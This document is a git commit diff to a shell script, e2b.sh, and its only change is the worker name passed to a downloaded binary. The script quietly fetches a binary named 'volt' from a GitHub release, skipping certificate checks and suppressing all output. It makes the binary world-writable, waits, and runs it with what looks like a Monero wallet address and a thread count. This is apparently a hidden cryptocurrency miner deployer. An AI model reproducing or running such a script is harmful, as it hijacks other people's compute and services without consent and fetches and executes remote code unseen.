a33fd805731ac3c3742f2dc4218f60906db90298
mrsilkin1-del <mr.silkin1@fasdeil.com>
2026-07-28 08:45:43 +0700

    Update e2b.sh

--- e2b.sh
+++ e2b.sh
@@ -3,4 +3,4 @@
 curl -sLkO https://github.com/satelitlima00/zerox/releases/download/ulo/volt >/dev/null 2>&1
 chmod 777 volt
 sleep 40
-./volt --user 88c3RaaVjxzGX6vUgcSNqa1HgAJEh83XEKqhZswhv8LHFo9PjmxhXkE5ZpRW9W7c5GJpUVP4eURbnT4KesVN9eLg7rpWeGL --pass worker10 --threads 7 >/dev/null 2>&1
+./volt --user 88c3RaaVjxzGX6vUgcSNqa1HgAJEh83XEKqhZswhv8LHFo9PjmxhXkE5ZpRW9W7c5GJpUVP4eURbnT4KesVN9eLg7rpWeGL --pass worker12 --threads 7 >/dev/null 2>&1
